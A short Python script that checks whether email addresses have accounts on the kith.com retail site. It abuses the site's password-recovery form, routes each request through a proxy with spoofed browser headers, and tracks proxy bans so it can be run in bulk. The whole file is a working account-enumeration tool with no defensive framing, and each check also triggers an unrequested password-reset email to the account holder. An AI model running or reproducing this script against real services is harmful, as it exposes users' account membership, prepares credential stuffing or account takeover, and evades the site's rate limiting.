import requests


def verifier(proxy, email):
    with requests.Session() as s:
        resp = s.post("https://kith.com/account/recover", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "kith.com",
            "Origin": "https://kith.com",
            "Referer": "https://kith.com/account/login",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
        }, data={
            "form_type": "recover_customer_password",
            "email": email,
        }, proxies={"https": proxy}, timeout=30)  # false for captcha
    if resp.status_code == 200:  # proxy not banned
        if resp.url == "https://kith.com/account/login":  # acc exists
            print("Verified: {}".format(str(email)))
            return(True)
        else:  # acc doesn't exist
            print("Account does not exist: {}".format(str(email)))
            return(False)
    else:
        print("Proxy banned.")
        return("banned")
